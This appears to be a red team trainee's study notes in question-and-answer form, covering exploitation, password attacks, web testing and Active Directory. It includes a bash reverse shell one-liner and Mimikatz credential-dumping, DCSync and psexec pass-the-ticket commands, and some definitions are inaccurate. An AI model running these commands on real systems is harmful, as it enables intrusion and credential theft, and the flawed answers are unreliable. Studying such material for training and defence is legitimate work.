
# 5.1 Exploitation
Explain the difference between the following and their associated risks:

***Remote Code Execution:*** 
`Answer:` Ability to execute commands from a remote host.
`Associated Risk:` Crash a system
`Example:` Logging into a web server with default credentials and executing `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1` to get a `reverse shell` 


***Local Code Execution***:
`Answer:` Utilizing code that is already present on a system to perform malicious activity
`Associated Risk:`  Unlikely to have risks.
`Example:` On a linux system noticing that `SUDO ALL NOPASSWD` privileges are present allowing for the `attacker` to privilege escalate utilizing native code.

***User-land exploits***:
`Answer:` Any exploit that can be found with a simple Google Search
`Associated Risk:`  must conduct `code-review` prior to throwing to ensure the code is doing what it is described to do. Ensure that there aren't malicious functions that are opening sockets for attackers.
`Example:` any exploit found on github with a `POC`

***Kernel exploits***:
`Answer:` An exploit that specifically targets a version of Operating System 
`Associated Risk:`  Likely to crash or restart a machine. If used against `DC` can break an entire network
`Example:` Linux Kernel 2.6.22 - 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation


***Describe how to reduce risk when conducting exploitation during an operation***:
`Explanation`: Practice utilizing the exploit prior to test, conduct code review to ensure the tester understands what the code is doing.

***Describe a recent exploit and how it functions***:

***Identify a resource that is typically used to find publicly available exploits***:
`Answer`:  exploitdb / github

***Describe the process for reviewing publicly found exploits before use in a customer network***:
`Answer`: Throw `.sln` file into `Visual Studio` and read through the code and comment functions to thoroughlt understand the code. Run the exploit against vulnerable machine in a Virtual Machine, take notes to see what the code did and if any errors occurred research into them to identify a fix.

***Describe the software approval process and where it is documented***:
`Answer`: Following code review and tool testing, a review document gets submitted to push identifying `trusted` or `untrusted`

# 5.2 Password Attacks

***Explain the differences between hashing and encryption***:
`Explanation`:  Hashing is typically used to validate information through this process - `plain text` -> `hash function` -> `hash text`
											Encryption is typically used to protect information through this process -  `plaint text` -> `encryption` -> `encrypted text` -> `decryption` -> `plaintext`

***Describe the different types of windows password hashes and where they are stored***:
`LM Hashes:` LM-hashes is the oldest password storage used by Windows, dating back to OS/2 in the 1980’s. Due to the limited charset allowed, they are fairly easy to crack. You can obtain them, if still available, from the SAM database on a Windows system, or the NTDS database on the Domain Controller.
`NTLM Hashes:` This is the way passwords are stored on modern Windows systems, and can be obtained by dumping the SAM database, or using Mimikatz. They are also stored on domain controllers in the NTDS file. These are the hashes you can use to [pass-the-hash](https://en.wikipedia.org/wiki/Pass_the_hash).
`NTLMv1 (A.K.A. Net-NTLMv1):` The NTLM protocol uses the NTHash in a challenge/response between a server and a client. A way of obtaining a response to crack from a client, [Responder is a great tool](https://github.com/lgandx/Responder).
`NTLMv2 (A.K.A. Net-NTLMv2):` This is the new and improved version of the NTLM protocol, which makes it a bit harder to crack. The concept is the same as NTLMv1, only different algorithm and responses sent to the server. Also captured through Responder or similar. Default in Windows since Windows 2000.

***Describe a Linux password hash and where they are stored***
	`Answer:` Linux uses a `SHA512` hash to store passwords in the `/etc/shadow file`
	the fields follow:
														**$1$** is MD5
														**$2a$** is Blowfish
														**$2y$** is Blowfish
														**$5$** is SHA-256
														**$6$** is SHA-512
														**$y$** is yescrypt

***Describe which password hashes are dumped from a domain joined target***
`Answer:` When dumping files from a domain joined target the `NTDS.DIT` file is dumped typically through the use of `mimikatz`, the hashes dumped are `NTLM`
`Explanation:` Mimikatz has a feature (dcsync) which utilises the Directory Replication Service (DRS) to retrieve the password hashes from the NTDS.DIT file.

***Explain the following types of password attacks:***
`Brute force:` **Uses trial and error to crack passwords, login credentials, and encryption keys**.
`Dictionary:`  **A type of brute force attack where an intruder attempts to crack a password-protected security system with a “dictionary list” of common words and phrases used by businesses and individuals.**
`Password Spraying:` **A type of brute force attack which involves a malicious actor attempting to use the same password on multiple accounts before moving on to try another one**.

***Describe common password cracking tools***:
	`Answer:` John the Ripper, Hashcat, ceWL

***Demonstrate the ability to crack some common password hashes***:
`Practical`: crack a password with rockyou.txt

***Explain pass-the-hash and its functionality***
`Answer:` A pass the hash attack is an exploit in which an attacker steals a hashed user credential and -- without cracking it -- reuses it to trick an authentication system into creating a new authenticated session on the same network. Pass the hash is primarily a lateral movement technique.

***Explain how you would go about dumping and parsing LSASS for passwords***: 
`Answer:` First we can use the `sekurlsa::logonPasswords` if we are working with an old Windows machine
							We can also use the `lsadump::lsa /patch` module to dump all the hashes from LSASS including the user accounts that were not dumped in logon passwords before.

***Describe what Dcsync is, how to do it and what it could be used for***
		`Answer:` DCSync is **a command within a Mimikatz that an attacker can leverage to simulate the behavior of Domain Controller (DC)**. More simply, it allows the attacker to pretend to be a DC and ask other DC's for user password data. DCSync attacks are difficult to prevent.
		
		`mimikatz lsadump::dcsync /domain:example.local /user:krbtgt`
		
		In order for a DCSync to be utilized the `non-privileged` user must have the permissions `Replicating Directory Changes` and `Replicating Directory Changes All` on the domain


***Describe the Windows SAM and how to extract hashes from it***
`Answer:` The Windows SAM is the location where local hashes are sotred on a windows device. Can be dumped using `mimikatz` 
`Command:` `mimikatz lsadump::san /system:C:\users\username\Desktop\System /sam:C:\Users\username\Desktop\sam`

# 5.3 Web Penetration Testing

***Describe the difference between a Black box and White box test***:
`Answer:` Black Box Testing is when you conduct a pen test without knowledge of internal design. White box testing is pen testing with knowledge of internal design.

***Explain how you would enumerate a webapp and what should you look for***
`Answer:` Port enumeration, directory busting, OWASP top 10 identification, http responses.

***Describe some common tools used to enumerate webapps***:
`Answer:` nmap, ffuf, gobuster, dirbuster, burpsuite, OWASP zap

***Describe web page file upload permissions and how it could be exploited***:
`Answer:` Unrestricted file upload allows for files to be uploaded and executed through the use of different exploits depending on version of Web App. A reverse shell could be uploaded to gain RCE.

***Explain common client-side and server-side protections and how they differ: 
`TBD`

***Describe Directory Brute forcing and what risk is associated:***
`Answer:` the process of requesting files and server directories to which there are no direct links in the application or the server's pages. This is usually done by getting the directory and filenames from a common names list. Kali Linux includes some tools to accomplish this task. Blasting a server with too many requests could crash the server.


***Describe the following vulnerabilities, discuss their risks, how they could be leveraged in a mission and tested for:***
`Command Injection:` Ability to execute arbitrary commands on the host operating system via a vulnerable application
`Server Side Request Forgery (SSRF):` Server-side request forgery is **a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location
`Cross-Site Scripting (XSS):` attack in which an attacker injects malicious executable scripts into the code of a trusted application or website.
`XML External Entities:` a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared
`Broken Authentication`: Broken authentication attacks aim to take over one or more accounts giving the attacker the same privileges as the attacked user.
`Local File Inclusion`:  an attack technique in which attackers trick a web application into either running or exposing files on a web server
`Remote File inclusion:` an attacker can cause the web application to include a remote file. This is possible for web applications that dynamically include external files or scripts.
`SQL Injection:` **a common attack vector that uses malicious SQL code for backend database manipulation to access information that was not intended to be displayed**

***Describe how to minimize risk associated with Data Modification***:
`???`

***SQLi:***
`Describe how a network defender could prevent a web page from being vulnerable to SQL injection:` Sanitization of code, testing.
`Describe how you would check for Blind SQL injection`: finding the version of SQL and researching types of queries to throw against database
`Discuss what could be discovered through a SQL injection attack.`: usernames, passwords, server data 
`Explain some ways it’s possible to attain remote code execution through SQL injection` Injection of scripts.
`Give some examples of commands we would want to avoid on a customer network.`: sqlmap generic queries due to flooding of server.


# 5.4 Web Pentesting Intercept Proxy

`Which interception proxy does the team use and why:` Burpsuite Proxy to gain the ability to analyze Requests as they are sent or received
`Describe the purpose of an intercept proxy during web testing`: Analysis
`Demonstrate the setup and usage of an intercept proxy`: Practical
`Explain how an intercept proxy can minimize risk`: Burpsuite repeater can be utilized to tailor requests prior to being sent.


# 5.7 Situational Awareness

`Explain what situational awareness is and how it applies to red team operations`:  Analyzing/Assessing current situation, stopping if needed, managing the environment.
`Discuss when situational awareness commands are ran and how often`: if/ipconfig, sysinfo/uname -a, dir/pwd
`Describe indicators of co-habitation`: weird processes,  connections to external machines on `RHP`'s 
`Explain how you would find the hostname and its importance`: in `sysinto` or `uname -a` depending on OS, this is important to understand what machine you are operating on
`Explain how you would check your network interfaces and what would you look for` netstat -anp tcp to check network interfaces that are running tcp. I'd look for `RHP`'s that are abnormal
`Explain how to check listening ports. What flags would you use and why` netstat -ano | find "LISTEN" 
-   -n            Displays addresses and port numbers in numerical form.
-   -o            Displays the owning process ID associated with each connection.
-   -a             Displays all connections and listening ports.
`Explain what are you looking for when looking at your listening ports` any beacons that could be listening
`Explain how you would list running processes, and what you are looking for` ps -elf/tasklist, i am looking for abnormal processes or antivirus running on the machine
`Discuss the importance of verifying what processes are running on an implanted customer system` to ensure when artifact removal occurs it is thorough
`Explain how to verify the architecture` sysinfo/uname
`Explain how to verify what privileges you have and any associated risk with checking`: powershell **Get-ADPermission**


# 5.8 Active Directory Environments


5.8 Active Directory Environments

`Briefly explain the basic functionality of Active Directory`: enables administrators to manage permissions and access to network resources
`Explain what each of the following active directory concepts are and demonstrate the ability to enumerate them`:
		Users: `execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-DomainUser`
		Groups: `execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-DomainGroup`
		Computers: `execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-DomainComputer -Properties DnsHostName`
		OUs: `execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-DomainOU -Properties Name`
		Trusted Domains: `import powerview` & `powerpick Get-DomainTrust`
Describe which attributes you would consider important when querying the domain: ???????
	Describe common Kerberos attacks:
	`ASREP Roasting`: If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password.
	`Kerberoasting`: **Kerberoasting** is a post-exploitation attack technique that attempts to obtain a password hash of an Active Directory account that has a Service Principal Name (“SPN”). 
	`How can you list the Kerberos tickets in the current user session`: klist command
	`How can you utilize a Kerberos ticket from a Linux context`: assuming that you have a tgt
		step 1: change the `TGT` file into a `.cache` file
		step 2: export the file to the specific variable `export KRB5CCNAME=administrator.ccache`
		step 3: psexec utilizing the file `proxychains impacket-psexec dev.admin.offshore.com/administrator@dc02.dev.admin.offshore.com -target-ip 172.16.2.6 -k -no-pass`

`Why do we use FQDN when using Kerberos tickets`: Kerberos requires FQDN, and doesn't work with IP Addresses


# 5.9 Application White Listing

`Describe application white listing and execution polices`: 
Application White Listing: allows specifically named executables to be on the white list i.e. `windows.exe` can run if its on the white list.
Execution Policy: PowerShell's execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files and runs scripts.

`Describe one example of a white list bypass`:  renaming an executable to a file that is known on the whitelist.


# 5.10 Persistence

Explain the role of persistence in Red Team operations: `keep the attacker to keep the infiltrated system under control for a long time`

Explain the proper way to document persistence artifacts: `personal notes, team notes, all within one note.`